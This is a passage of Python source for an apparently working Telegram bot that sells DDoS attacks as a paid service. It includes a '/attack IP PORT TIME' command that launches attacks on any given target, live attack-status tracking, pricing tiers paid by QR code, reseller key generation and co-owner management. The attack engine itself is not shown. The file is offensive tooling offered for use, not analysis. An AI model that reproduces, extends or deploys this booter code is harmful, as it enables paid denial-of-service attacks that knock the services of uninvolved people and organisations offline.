            ai_msg = "Aree Boss aagaye! 😎 Bolo kya scene hai aaj? Sab set hai, bot full power pe chal raha hai ❤️"
        elif is_co_owner(user_id):
            ai_msg = "Welcome back bhai! Bot ready hai, bolo kya karna hai 😎"
        else:
            ai_msg = "Haa bhai sun, DDOS bot me welcome hai! 😎 Yaha best DDOS plans milenge. /price karo aur dekh lo plans, phir yahi baat karo mai reply krunga 💥"
        try:
            bot.send_message(message.chat.id, ai_msg)
        except:
            pass
    
    threading.Thread(target=ai_welcome, daemon=True).start()

# ==================== HELP COMMAND ====================
@bot.message_handler(commands=['help'])
def help_cmd(message):
    user_id = str(message.from_user.id)
    is_res = is_reseller(user_id)
    is_owner = str(user_id) == OWNER_ID or is_co_owner(user_id)
    
    help_text = """╔══════════════════════════════╗
║  🤖 COMMAND CENTER         ║
╚══════════════════════════════╝

<b>📌 BASIC COMMANDS</b>
/attack IP PORT TIME - Launch attack
/status - View active attacks
/id - Get your user ID
/redeem KEY - Activate key
/price - View DDOS pricing plans
"""
    
    if is_res or is_owner:
        help_text += """
<b>💰 RESELLER COMMANDS</b>
/genkey TYPE COUNT - Generate keys
/balance - Check credits
/mykeys - Your keys
/reseller_panel - Reseller dashboard
Types: 12h, 1d, 2d, 3d, 7d, 30d
"""
    
    if is_owner:
        help_text += """
<b>👑 KEY MANAGEMENT</b>
/genadmin PREFIX DUR UNIT COUNT - Gen keys
/genadvkey PREFIX DUR UNIT COUNT MAXUSERS - Gen multi-use keys
/allkeys - View all keys
/removekey KEY - Remove key
/inkey KEY AMOUNT UNIT - Increase key
/removeinkey KEY AMOUNT UNIT - Decrease key
/inallkey AMOUNT UNIT - Increase all
/allremoveinkey AMOUNT UNIT - Decrease all
/keyinfo Key - to see key info

<b>👑 GROUP MANAGEMENT</b>
/groups - List groups

<b>👑 USER MANAGEMENT</b>
/users - List users
/removeuser ID - Remove user
/removeuserkey ID - Remove user key
/extenduser ID DAYS - Extend user
/ban ID REASON - Ban user
/unban ID - Unban user
/bannedlist - List banned

<b>👑 RESELLER MANAGEMENT</b>
/addreseller ID - Add reseller
/removereseller ID - Remove reseller
/remove_reseller_balance ID - Reset balance
/resellers - List resellers
/addbalance ID AMT - Add balance

<b>👑 CO-OWNER MANAGEMENT</b>
/addcoowner ID - Add co-owner
/removecoowner ID - Remove co-owner
/coowners - List co-owners

<b>👑 QR & SYSTEM</b>
/setqr - Set payment QR code
/removeqr - Remove QR code
/setlimit MAX DUR COOLDOWN - Set limits
/broadcast MSG - Send broadcast
/stats - Statistics
/systeminfo - System info
/logs - View logs
/clearlogs - Clear logs
"""
    
    bot.reply_to(message, help_text, parse_mode="HTML")

# ==================== PRICE COMMAND ====================
@bot.message_handler(commands=['price'])
def price_cmd(message):
    keyboard = [
        [InlineKeyboardButton("✅ 12 HOUR ➜ ₹50", callback_data="buy_12h")],
        [InlineKeyboardButton("🏷 1 DAY ➜ ₹90", callback_data="buy_1d")],
        [InlineKeyboardButton("🛍 2 DAYS ➜ ₹150", callback_data="buy_2d")],
        [InlineKeyboardButton("😀 3 DAYS ➜ ₹200", callback_data="buy_3d")],
        [InlineKeyboardButton("😀 7 DAYS ➜ ₹300", callback_data="buy_7d")],
    ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    bot.send_message(
        message.chat.id,
        "😀 *BOT PRICES* 😀\n\n👇 *Choose your plan:*",
        parse_mode="Markdown",
        reply_markup=reply_markup
    )

# ==================== CALLBACK HANDLERS ====================
@bot.callback_query_handler(func=lambda call: call.data.startswith('buy_'))
def handle_price_selection(call):
    plan_key = call.data.replace('buy_', '')
    
    if plan_key in DDOS_PRICING:
        plan = DDOS_PRICING[plan_key]
        
        bot.edit_message_text(
            f"✅ *You selected:*\n\n"
            f"📦 Plan: *{plan['name']}*\n"
            f"💰 Price: *{plan['price']}*\n\n"
            f"🔹 Payment QR bhej raha hu...",
            call.message.chat.id,
            call.message.message_id,
            parse_mode="Markdown"
        )
        
        qr_data = load_qr()
        if qr_data.get("qr_file_id"):
            try:
                bot.send_photo(
                    call.message.chat.id,
                    qr_data["qr_file_id"],
                    caption=(
                        f"💳 *Payment for {plan['name']}*\n\n"
                        f"💰 Amount: *{plan['price']}*\n\n"
                        f"📱 QR scan karo aur payment karo\n"
                        f"📸 Payment ke baad screenshot bhejo\n"
                        f"⏱️ 2 min me approval ke sath key milega payment krke hi dm krna\n\n"
                        f"👑 Owner: @GOD_x_OFFICIAL"
                    ),
                    parse_mode="Markdown"
                )
            except:
                bot.send_message(call.message.chat.id, "❌ QR not set. Contact @GOD_x_OFFICIAL")
        else:
            bot.send_message(call.message.chat.id, "❌ QR not set. Contact @GOD_x_OFFICIAL")
    
    bot.answer_callback_query(call.id)

# ==================== SET QR COMMAND ====================
@bot.message_handler(commands=['setqr'])
def setqr_cmd(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "╔══════════════════════════════╗\n║    ❌ ADMIN ONLY            ║\n╚══════════════════════════════╝", parse_mode="HTML")
        return
    
    msg = bot.reply_to(message, "📸 Ab apna QR code ka photo bhejo, main set kar dunga...")
    bot.register_next_step_handler(msg, process_qr_photo)

def process_qr_photo(message):
    if not message.photo:
        bot.reply_to(message, "❌ Photo bhejo bhai, QR code ka photo!")
        return
    
    file_id = message.photo[-1].file_id
    
    qr_data = load_qr()
    qr_data["qr_file_id"] = file_id
    qr_data["set_by"] = str(message.from_user.id)
    qr_data["set_at"] = datetime.datetime.now().isoformat()
    save_qr(qr_data)
    
    bot.reply_to(message, "✅ *QR Code set ho gaya!*\n\nAb jab bhi koi user price select karega, ye QR bheja jayega.", parse_mode="Markdown")

# ==================== REMOVE QR COMMAND ====================
@bot.message_handler(commands=['removeqr'])
def removeqr_cmd(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "╔══════════════════════════════╗\n║    ❌ ADMIN ONLY            ║\n╚══════════════════════════════╝", parse_mode="HTML")
        return
    
    qr_data = load_qr()
    qr_data["qr_file_id"] = None
    qr_data["removed_by"] = str(message.from_user.id)
    qr_data["removed_at"] = datetime.datetime.now().isoformat()
    save_qr(qr_data)
    
    bot.reply_to(message, "✅ *QR Code remove ho gaya!*", parse_mode="Markdown")

# ==================== KEYINFO COMMAND ====================
@bot.message_handler(commands=['keyinfo'])
def keyinfo_cmd(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "╔══════════════════════════════╗\n║    ❌ ADMIN ONLY            ║\n╚══════════════════════════════╝", parse_mode="HTML")
        return
    
    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, "╔══════════════════════════════╗\n║    ❌ INVALID USAGE         ║\n╚══════════════════════════════╝\n\n/keyinfo KEY", parse_mode="HTML")
        return
    
    key = args[1]
    keys_data = load_json(KEYS_FILE, {"used": {}, "unused": {}})
    
    if key in keys_data["unused"]:
        info = keys_data["unused"][key]
        msg = f"""╔══════════════════════════════╗
║    🔑 KEY INFORMATION        ║
╚══════════════════════════════╝

<b>Key:</b> <code>{key}</code>
<b>Status:</b> 🟢 UNUSED
<b>Duration:</b> {info['duration']}{info['unit']}
<b>Generated:</b> {info['generated']}
<b>Generated By:</b> {info['generated_by']}
<b>Max Users:</b> {info.get('max_users', 1)}
<b>Redeemed:</b> {info.get('redeemed_count', 0)}/{info.get('max_users', 1)}
<b>Redeemed Users:</b> {', '.join(info.get('redeemed_users', [])) or 'None'}"""
        bot.reply_to(message, msg, parse_mode="HTML")
        return
    
    if key in keys_data["used"]:
        info = keys_data["used"][key]
        user_id = info.get("used_by", "Unknown")
        
        msg = f"""╔══════════════════════════════╗
║    🔑 KEY INFORMATION        ║
╚══════════════════════════════╝

<b>Key:</b> <code>{key}</code>
<b>Status:</b> 🔴 USED
<b>Duration:</b> {info['duration']}{info['unit']}
<b>Generated:</b> {info['generated']}
<b>Generated By:</b> {info['generated_by']}
<b>Used By:</b> <code>{user_id}</code>
<b>Used At:</b> {info.get('used_at', 'Unknown')}
<b>Expires:</b> {info.get('expiry', 'Unknown')}
<b>Max Users:</b> {info.get('max_users', 1)}
<b>Redeemed:</b> {info.get('redeemed_count', 0)}/{info.get('max_users', 1)}
<b>Redeemed Users:</b> {', '.join(info.get('redeemed_users', [])) or 'None'}"""
        bot.reply_to(message, msg, parse_mode="HTML")
        return
    
    bot.reply_to(message, "❌ Key not found", parse_mode="HTML")

# ==================== ID COMMAND ====================
@bot.message_handler(commands=['id'])
def id_cmd(message):
    bot.reply_to(message, f"🆔 Your User ID: <code>{message.from_user.id}</code>", parse_mode="HTML")

# ==================== STATUS COMMAND ====================
@bot.message_handler(commands=['status'])
def status_cmd(message):
    user_id = message.from_user.id
    is_group = message.chat.type in ["group", "supergroup"]
    group_id = message.chat.id if is_group else None
    
    if not is_group:
        if str(user_id) != OWNER_ID and not is_co_owner(user_id):
            allowed, _ = is_user_allowed(user_id)
            if not allowed:
                bot.reply_to(message, "❌ Active plan required to view status\nUse /redeem &lt;key&gt; to activate", parse_mode="HTML")
                return
    
    if is_group:
        attacks = group_active_attacks.get(str(group_id), {})
        cooldown_remaining = is_user_in_group_cooldown(group_id, user_id)
        settings = get_group_settings(group_id)
        max_attacks = settings["max_concurrent"]
    else:
        attacks = active_attacks
        cooldown_remaining = max(0, int(user_cooldowns.get(user_id, 0) - time.time())) if user_id in user_cooldowns else 0
        max_attacks = MAX_CONCURRENT_ATTACKS
    
    status_msg = (
        f"╔══════════════════════════════╗\n"
        f"║     ⚔️ ATTACK STATUS       ║\n"
        f"╚══════════════════════════════╝\n\n"
    )
    
    status_msg += f"📊 Slots: {len(attacks)}/{max_attacks} used\n"
    status_msg += f"🆓 Available: {max_attacks - len(attacks)} slots\n\n"
    
    if attacks:
        status_msg += "━━━ ACTIVE ATTACKS ━━━\n\n"
        for uid, attack in list(attacks.items())[:10]:
            elapsed = int(time.time() - attack["start_time"])
            remaining = max(0, attack["duration"] - elapsed)
            progress = int((elapsed / attack["duration"]) * 100) if attack["duration"] > 0 else 0
            bar = generate_progress_bar(progress)
            
            status_msg += (
                f"🎯 {attack['target']}:{attack['port']}\n"
                f"⏱️ {format_time(remaining)} left\n"
                f"[{bar}] {progress}%\n\n"
            )
    else:
        status_msg += "📭 No active attacks\n\n"
    
    status_msg += "━━━ YOUR STATUS ━━━\n"
    if cooldown_remaining > 0:
        status_msg += f"⏳ Cooldown: {format_time(cooldown_remaining)}\n"
    else:
        status_msg += f"✅ No cooldown active\n"
    
    msg = bot.reply_to(message, status_msg, parse_mode="Markdown")
    
    if attacks or cooldown_remaining > 0:
        threading.Thread(target=update_status_continuous, args=(message.chat.id, user_id, msg.message_id, is_group, group_id), daemon=True).start()

# ==================== ATTACK COMMAND ====================
@bot.message_handler(commands=['attack'])
def attack_cmd(message):
    user_id = message.from_user.id
    is_group = message.chat.type in ["group", "supergroup"]
    group_id = message.chat.id if is_group else None
    username = message.from_user.username or message.from_user.first_name
    
    args = message.text.split()
    if len(args) != 4:
        bot.reply_to(
            message,
            """╔══════════════════════════════╗
║    ❌ INVALID USAGE         ║
╚══════════════════════════════╝

/attack &lt;ip&gt; &lt;port&gt; &lt;duration&gt;

💡 Example: /attack 1.1.1.1 8080 60
⏱️ Min: 10s | Max: 300s""",
            parse_mode="HTML"
        )
        return
    
    target, port, duration = args[1], args[2], args[3]
    
    try:
        port = int(port)
        if port < 1 or port > 65535:
            bot.reply_to(message, "❌ Port must be 1-65535", parse_mode="HTML")
            return
    except:
        bot.reply_to(message, "❌ Invalid port", parse_mode="HTML")
        return
    
    try:
        duration = int(duration)
        if duration < 10:
            bot.reply_to(message, "❌ Minimum 10 seconds", parse_mode="HTML")
            return
        
        if is_group:
            settings = get_group_settings(group_id)
            if duration > settings["max_duration"]:
                bot.reply_to(message, f"❌ Max duration: {settings['max_duration']}s", parse_mode="HTML")
                return
        else:
            if str(user_id) != OWNER_ID and not is_co_owner(user_id) and duration > MAX_ATTACK_DURATION:
                bot.reply_to(message, f"❌ Max duration: {MAX_ATTACK_DURATION}s", parse_mode="HTML")
                return
    except:
        bot.reply_to(message, "❌ Invalid duration", parse_mode="HTML")
        return
    
    start_attack(message.chat.id, user_id, target, port, duration, username, is_group, group_id)

# ==================== REDEEM COMMAND ====================
@bot.message_handler(commands=['redeem'])
def redeem_cmd(message):
    if message.chat.type in ["group", "supergroup"]:
        bot.reply_to(message, "👀 Use /redeem in private chat", parse_mode="HTML")
        return
    
    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, """╔══════════════════════════════╗
║    ❌ INVALID USAGE         ║
╚══════════════════════════════╝

/redeem &lt;key&gt;""", parse_mode="HTML")
        return
    
    key = args[1]
    user_id = str(message.from_user.id)
    
    result, expiry = redeem_key(user_id, key)
    
    if result == "invalid":
        bot.reply_to(message, "❌ Invalid key", parse_mode="HTML")
    elif result == "expired":
        bot.reply_to(message, "❌ Key already used", parse_mode="HTML")
    elif result == "max_redeemed":
        bot.reply_to(message, """╔══════════════════════════════╗
║  ⚠️ MAX USERS REACHED      ║
╚══════════════════════════════╝

This key has reached max users
Purchase new key from seller""", parse_mode="HTML")
    elif result == "already_active":
        bot.reply_to(message, "❌ You already have an active plan", parse_mode="HTML")
    elif result == "success":
        remaining = expiry - datetime.datetime.now()
        days = remaining.days
        hours = remaining.seconds // 3600
        minutes = (remaining.seconds % 3600) // 60
        
        bot.reply_to(
            message,
            f"""╔══════════════════════════════╗
║   ✅ KEY REDEEMED          ║
╚══════════════════════════════╝

📅 {days}d {hours}h {minutes}m
⏰ Expires: {expiry.strftime('%Y-%m-%d %H:%M')}""",
            parse_mode="HTML"
        )

# ==================== RESELLER COMMANDS ====================
@bot.message_handler(commands=['balance'])
def balance_cmd(message):
    if message.chat.type in ["group", "supergroup"]:
        bot.reply_to(message, "❌ Use /balance in private chat", parse_mode="HTML")
        return
    
    user_id = str(message.from_user.id)
    
    if not is_reseller(user_id) and not is_admin(user_id):
        bot.reply_to(message, "❌ Not a reseller", parse_mode="HTML")
        return
    
    balance = get_balance(user_id)
    bot.reply_to(message, f"💰 Balance: {balance} credits", parse_mode="HTML")

@bot.message_handler(commands=['genkey'])
def genkey_cmd(message):
    if message.chat.type in ["group", "supergroup"]:
        bot.reply_to(message, "❌ Use /genkey in private chat", parse_mode="HTML")
        return
    
    user_id = str(message.from_user.id)
    
    if not is_reseller(user_id) and not is_admin(user_id):
        bot.reply_to(message, "❌ Not a reseller", parse_mode="HTML")
        return
    
    args = message.text.split()
    if len(args) != 3:
        bot.reply_to(message, """╔══════════════════════════════╗
║    ❌ INVALID USAGE         ║
╚══════════════════════════════╝

/genkey TYPE COUNT
Types: 12h, 1d, 2d, 3d, 7d, 30d""", parse_mode="HTML")
        return
    
    key_type = args[1].lower()
    try:
        count = int(args[2])
        if count < 1 or count > 50:
            bot.reply_to(message, "❌ Count must be 1-50", parse_mode="HTML")
            return
    except:
        bot.reply_to(message, "❌ Invalid count", parse_mode="HTML")
        return
    
    if key_type not in RESELLER_KEY_PRICING:
        bot.reply_to(message, "❌ Invalid type", parse_mode="HTML")
        return
    
    cost = RESELLER_KEY_PRICING[key_type]["credits"] * count
    current_balance = get_balance(user_id)
    
    if user_id != OWNER_ID and not is_co_owner(user_id) and current_balance < cost:
        bot.reply_to(message, f"❌ Insufficient balance\nNeed: {cost} | Have: {current_balance}", parse_mode="HTML")
        return
    
    keys, error = generate_keys_reseller(user_id, key_type, count)
    if error:
        bot.reply_to(message, f"❌ {error}", parse_mode="HTML")
        return
    
    keys_text = "\n".join([f"<code>{k}</code>" for k in keys])
    new_balance = get_balance(user_id)
    
    bot.reply_to(
        message,
        f"""╔══════════════════════════════╗
║   ✅ KEYS GENERATED        ║
╚══════════════════════════════╝

📦 {count} keys
💎 Cost: {cost} credits
💰 Balance: {new_balance}

{keys_text}""",
        parse_mode="HTML"
    )

@bot.message_handler(commands=['mykeys'])
def mykeys_cmd(message):
    if message.chat.type in ["group", "supergroup"]:
        bot.reply_to(message, "❌ Use /mykeys in private chat", parse_mode="HTML")
        return
    
    user_id = str(message.from_user.id)
    
    if not is_reseller(user_id) and not is_admin(user_id):
        bot.reply_to(message, "❌ Not a reseller", parse_mode="HTML")
        return
    
    keys_data = load_json(KEYS_FILE, {"used": {}, "unused": {}})
    my_keys = [k for k, v in keys_data["unused"].items() if v.get("generated_by") == user_id]
    
    if not my_keys:
        bot.reply_to(message, "📦 No keys found", parse_mode="HTML")
        return
    
    msg = """╔══════════════════════════════╗
║    🔑 MY KEYS              ║
╚══════════════════════════════╝

"""
    msg += f"📦 Total: {len(my_keys)}\n\n"
    
    for k in my_keys[:20]:
        info = keys_data["unused"][k]
        used_count = info.get("redeemed_count", 0)
        max_users = info.get("max_users", 1)
        msg += f"<code>{k}</code>\n"
        msg += f"  👥 {used_count}/{max_users} used | ⏱️ {info['duration']}{info['unit']}\n\n"
    
    if len(my_keys) > 20:
        msg += f"... and {len(my_keys) - 20} more"
    
    bot.reply_to(message, msg[:4000], parse_mode="HTML")

@bot.message_handler(commands=['reseller_panel'])
def reseller_panel_cmd(message):
    if message.chat.type in ["group", "supergroup"]:
        bot.reply_to(message, "❌ Use in private chat", parse_mode="HTML")
        return
    
    user_id = str(message.from_user.id)
    
    if not is_reseller(user_id) and not is_admin(user_id):
        bot.reply_to(message, "❌ Reseller access required", parse_mode="HTML")
        return
    
    balance = get_balance(user_id)
    keys_data = load_json(KEYS_FILE, {"used": {}, "unused": {}})
    
    my_keys = [k for k, v in keys_data["unused"].items() if v.get("generated_by") == user_id]
    total_used = 0
    total_users = 0
    for k in my_keys:
        info = keys_data["unused"][k]
        total_used += info.get("redeemed_count", 0)
        total_users += info.get("max_users", 1)
    
    msg = """╔══════════════════════════════╗
║  💰 RESELLER DASHBOARD     ║
╚══════════════════════════════╝

"""
    msg += f"💰 Balance: {balance} credits\n"
    msg += f"🔑 Keys Available: {len(my_keys)}\n"
    msg += f"👥 Used Slots: {total_used}/{total_users}\n\n"
    
    msg += "━━━ PRICING ━━━\n\n"
    for ktype, info in RESELLER_KEY_PRICING.items():
        msg += f"• {info['name']}: {info['credits']} credits\n"
    
    msg += "\nUse /genkey TYPE COUNT to generate"
    
    bot.reply_to(message, msg, parse_mode="HTML")

# ==================== GROUP COMMANDS ====================
@bot.message_handler(commands=['approvegroup'])
def approvegroup_cmd(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "╔══════════════════════════════╗\n║    ❌ ADMIN ONLY            ║\n╚══════════════════════════════╝", parse_mode="HTML")
        return
    
    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, "╔══════════════════════════════╗\n║    ❌ INVALID USAGE         ║\n╚══════════════════════════════╝\n\n/approvegroup GROUP_ID", parse_mode="HTML")
        return
    
    group_id = args[1]
    groups = load_approved_groups()
    groups[group_id] = {
        "approved": True,
        "approved_by": str(message.from_user.id),
        "approved_at": datetime.datetime.now().isoformat(),
        "max_concurrent": GROUP_MAX_CONCURRENT,
        "max_duration": GROUP_MAX_DURATION,
        "cooldown": GROUP_COOLDOWN_SECONDS
    }
    save_approved_groups(groups)
    
    bot.reply_to(
        message,
        f"""╔══════════════════════════════╗
║   ✅ GROUP APPROVED        ║
╚══════════════════════════════╝

🆔 {group_id}
⚔️ Max: {GROUP_MAX_CONCURRENT} concurrent
⏱️ Duration: {GROUP_MAX_DURATION}s
🕐 Cooldown: {GROUP_COOLDOWN_SECONDS}s""",
        parse_mode="HTML"
    )

@bot.message_handler(commands=['removegroup'])
def removegroup_cmd(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "╔══════════════════════════════╗\n║    ❌ ADMIN ONLY            ║\n╚══════════════════════════════╝", parse_mode="HTML")
        return
    
    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, "╔══════════════════════════════╗\n║    ❌ INVALID USAGE         ║\n╚══════════════════════════════╝\n\n/removegroup GROUP_ID", parse_mode="HTML")
        return
    
    group_id = args[1]
    groups = load_approved_groups()
    if group_id in groups:
        del groups[group_id]
        save_approved_groups(groups)
        bot.reply_to(message, f"╔══════════════════════════════╗\n║   ✅ GROUP REMOVED          ║\n╚══════════════════════════════╝\n\n{group_id}", parse_mode="HTML")
    else:
        bot.reply_to(message, "❌ Group not found", parse_mode="HTML")

@bot.message_handler(commands=['setgroupmax'])
def setgroupmax_cmd(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "╔══════════════════════════════╗\n║    ❌ ADMIN ONLY            ║\n╚══════════════════════════════╝", parse_mode="HTML")
        return
    
    args = message.text.split()
    if len(args) != 5:
        bot.reply_to(message, "╔══════════════════════════════╗\n║    ❌ INVALID USAGE         ║\n╚══════════════════════════════╝\n\n/setgroupmax G_ID MAX_C MAX_D COOLDOWN", parse_mode="HTML")
        return
    
    group_id = args[1]
    try:
        max_concurrent = int(args[2])
        max_duration = int(args[3])
        cooldown = int(args[4])
    except:
        bot.reply_to(message, "❌ Invalid values", parse_mode="HTML")
        return
    
    set_group_settings(group_id, max_concurrent, max_duration, cooldown)
    bot.reply_to(
        message,
        f"""╔══════════════════════════════╗
║  ✅ SETTINGS UPDATED       ║
╚══════════════════════════════╝

🆔 {group_id}
⚔️ Max: {max_concurrent}
⏱️ Duration: {max_duration}s
🕐 Cooldown: {cooldown}s""",
        parse_mode="HTML"
    )

@bot.message_handler(commands=['groups'])
def groups_cmd(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "╔══════════════════════════════╗\n║    ❌ ADMIN ONLY            ║\n╚══════════════════════════════╝", parse_mode="HTML")
        return
    
    groups = load_approved_groups()
    if not groups:
        bot.reply_to(message, "📦 No approved groups", parse_mode="HTML")
        return
    
    msg = """╔══════════════════════════════╗
║   👥 APPROVED GROUPS       ║
╚══════════════════════════════╝

"""
    for group_id, info in groups.items():
        settings = get_group_settings(group_id)
        msg += f"🆔 {group_id}\n⚔️ Max: {settings['max_concurrent']} | ⏱️ {settings['max_duration']}s | 🕐 {settings['cooldown']}s\n\n"
    
    bot.reply_to(message, msg[:4000], parse_mode="HTML")

# ==================== CO-OWNER COMMANDS ====================
@bot.message_handler(commands=['addcoowner'])
def addcoowner_cmd(message):
    if str(message.from_user.id) != OWNER_ID:
        bot.reply_to(message, "╔══════════════════════════════╗\n║    ❌ OWNER ONLY            ║\n╚══════════════════════════════╝", parse_mode="HTML")
        return
    
    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, "╔══════════════════════════════╗\n║    ❌ INVALID USAGE         ║\n╚══════════════════════════════╝\n\n/addcoowner USER_ID", parse_mode="HTML")
        return
    
    if add_co_owner(args[1]):
        bot.reply_to(message, f"""╔══════════════════════════════╗
║   ✅ CO-OWNER ADDED        ║
╚══════════════════════════════╝

🆔 {args[1]}
👑 Full access granted""", parse_mode="HTML")
    else:
        bot.reply_to(message, "❌ Already co-owner", parse_mode="HTML")

@bot.message_handler(commands=['removecoowner'])
def removecoowner_cmd(message):
    if str(message.from_user.id) != OWNER_ID:
        bot.reply_to(message, "╔══════════════════════════════╗\n║    ❌ OWNER ONLY            ║\n╚══════════════════════════════╝", parse_mode="HTML")
        return
    
    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, "╔══════════════════════════════╗\n║    ❌ INVALID USAGE         ║\n╚══════════════════════════════╝\n\n/removecoowner USER_ID", parse_mode="HTML")
        return
    
    if remove_co_owner(args[1]):
        bot.reply_to(message, f"""╔══════════════════════════════╗
║  ✅ CO-OWNER REMOVED       ║
╚══════════════════════════════╝

🆔 {args[1]}""", parse_mode="HTML")
    else:
        bot.reply_to(message, "❌ Not co-owner", parse_mode="HTML")

@bot.message_handler(commands=['coowners'])
def coowners_cmd(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "╔══════════════════════════════╗\n║    ❌ ADMIN ONLY            ║\n╚══════════════════════════════╝", parse_mode="HTML")
        return
    
    co_owners = load_co_owners()
    if not co_owners:
        bot.reply_to(message, "📦 No co-owners", parse_mode="HTML")
        return
    
    msg = """╔══════════════════════════════╗
║    👑 CO-OWNERS LIST       ║
╚══════════════════════════════╝

"""
    for uid in co_owners:
        msg += f"• <code>{uid}</code>\n"
    
    bot.reply_to(message, msg, parse_mode="HTML")

# ==================== ADMIN COMMANDS ====================
@bot.message_handler(commands=['genadmin'])
def genadmin_cmd(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "╔══════════════════════════════╗\n║    ❌ ADMIN ONLY            ║\n╚══════════════════════════════╝", parse_mode="HTML")
        return
    
    args = message.text.split()
    if len(args) != 5:
        bot.reply_to(message, """╔══════════════════════════════╗
║    ❌ INVALID USAGE         ║
╚══════════════════════════════╝

/genadmin PREFIX DUR UNIT COUNT
Example: /genadmin VIP 7 day 10""", parse_mode="HTML")
        return
    
    prefix = args[1]
    try:
        duration = int(args[2])
        unit = args[3].lower()
        count = int(args[4])
        if unit not in ["min", "hour", "day"]:
            bot.reply_to(message, "❌ Unit: min, hour, day", parse_mode="HTML")
            return
    except:
        bot.reply_to(message, "❌ Invalid values", parse_mode="HTML")
        return
    
    keys = generate_keys_admin(prefix, duration, unit, count)
    keys_text = "\n".join([f"<code>{k}</code>" for k in keys])
    bot.reply_to(message, f"""╔══════════════════════════════╗
║   ✅ KEYS GENERATED        ║
╚══════════════════════════════╝

{count} keys

{keys_text}""", parse_mode="HTML")

@bot.message_handler(commands=['genadvkey'])
def genadvkey_cmd(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "╔══════════════════════════════╗\n║    ❌ ADMIN ONLY            ║\n╚══════════════════════════════╝", parse_mode="HTML")
        return
    
    args = message.text.split()
    if len(args) != 6:
        bot.reply_to(message, """╔══════════════════════════════╗
║    ❌ INVALID USAGE         ║
╚══════════════════════════════╝

/genadvkey PREFIX DUR UNIT COUNT MAX_USERS
Example: /genadvkey VIP 7 day 10 5""", parse_mode="HTML")
        return
    
    prefix = args[1]
    try:
        duration = int(args[2])
        unit = args[3].lower()
        count = int(args[4])
        max_users = int(args[5])
        if unit not in ["min", "hour", "day"]:
            bot.reply_to(message, "❌ Unit: min, hour, day", parse_mode="HTML")
            return
    except:
        bot.reply_to(message, "❌ Invalid values", parse_mode="HTML")
        return
    
    keys = generate_keys_admin(prefix, duration, unit, count, max_users)
    keys_text = "\n".join([f"<code>{k}</code>" for k in keys])
    bot.reply_to(message, f"""╔══════════════════════════════╗
║   ✅ KEYS GENERATED        ║
╚══════════════════════════════╝

{count} keys
👥 Max {max_users} users each

{keys_text}""", parse_mode="HTML")

@bot.message_handler(commands=['inkey'])
def inkey_cmd(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "╔══════════════════════════════╗\n║    ❌ ADMIN ONLY            ║\n╚══════════════════════════════╝", parse_mode="HTML")
        return
    
    args = message.text.split()
    if len(args) != 4:
        bot.reply_to(message, """╔══════════════════════════════╗
║    ❌ INVALID USAGE         ║
╚══════════════════════════════╝

/inkey KEY AMOUNT UNIT""", parse_mode="HTML")
        return
    
    key = args[1]
    try:
        amount = int(args[2])
        unit = args[3].lower()
    except:
        bot.reply_to(message, "❌ Invalid values", parse_mode="HTML")
        return
    
    success, status = increase_key_duration(key, amount, unit)
    if success:
        bot.reply_to(message, f"✅ Key duration +{amount}{unit} [{status}]", parse_mode="HTML")
    else:
        bot.reply_to(message, "❌ Key not found", parse_mode="HTML")

@bot.message_handler(commands=['removeinkey'])
def removeinkey_cmd(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "╔══════════════════════════════╗\n║    ❌ ADMIN ONLY            ║\n╚══════════════════════════════╝", parse_mode="HTML")
        return
    
    args = message.text.split()
    if len(args) != 4:
        bot.reply_to(message, """╔══════════════════════════════╗
║    ❌ INVALID USAGE         ║
╚══════════════════════════════╝

/removeinkey KEY AMOUNT UNIT""", parse_mode="HTML")
        return
    
    key = args[1]
    try:
        amount = int(args[2])
        unit = args[3].lower()
    except:
        bot.reply_to(message, "❌ Invalid values", parse_mode="HTML")
        return
    
    success, status = decrease_key_duration(key, amount, unit)
    if success:
        bot.reply_to(message, f"✅ Key duration -{amount}{unit} [{status}]", parse_mode="HTML")
    else:
        bot.reply_to(message, "❌ Key not found", parse_mode="HTML")

@bot.message_handler(commands=['inallkey'])
def inallkey_cmd(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "╔══════════════════════════════╗\n║    ❌ ADMIN ONLY            ║\n╚══════════════════════════════╝", parse_mode="HTML")
        return
    
    args = message.text.split()
    if len(args) != 3:
        bot.reply_to(message, """╔══════════════════════════════╗
║    ❌ INVALID USAGE         ║
╚══════════════════════════════╝

/inallkey AMOUNT UNIT""", parse_mode="HTML")
        return
    
    try:
        amount = int(args[1])
        unit = args[2].lower()
    except:
        bot.reply_to(message, "❌ Invalid values", parse_mode="HTML")
        return
    
    count = increase_all_keys(amount, unit)
    bot.reply_to(message, f"✅ {count} keys +{amount}{unit}", parse_mode="HTML")

@bot.message_handler(commands=['allremoveinkey'])
def allremoveinkey_cmd(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "╔══════════════════════════════╗\n║    ❌ ADMIN ONLY            ║\n╚══════════════════════════════╝", parse_mode="HTML")
        return
    
    args = message.text.split()
    if len(args) != 3:
        bot.reply_to(message, """╔══════════════════════════════╗
║    ❌ INVALID USAGE         ║
╚══════════════════════════════╝

/allremoveinkey AMOUNT UNIT""", parse_mode="HTML")
        return
    
    try:
        amount = int(args[1])
        unit = args[2].lower()
    except:
        bot.reply_to(message, "❌ Invalid values", parse_mode="HTML")
        return
    
    count = decrease_all_keys(amount, unit)
    bot.reply_to(message, f"✅ {count} keys -{amount}{unit}", parse_mode="HTML")

@bot.message_handler(commands=['addreseller'])
def addreseller_cmd(message):
    if not is_admin(message.from_user.id):
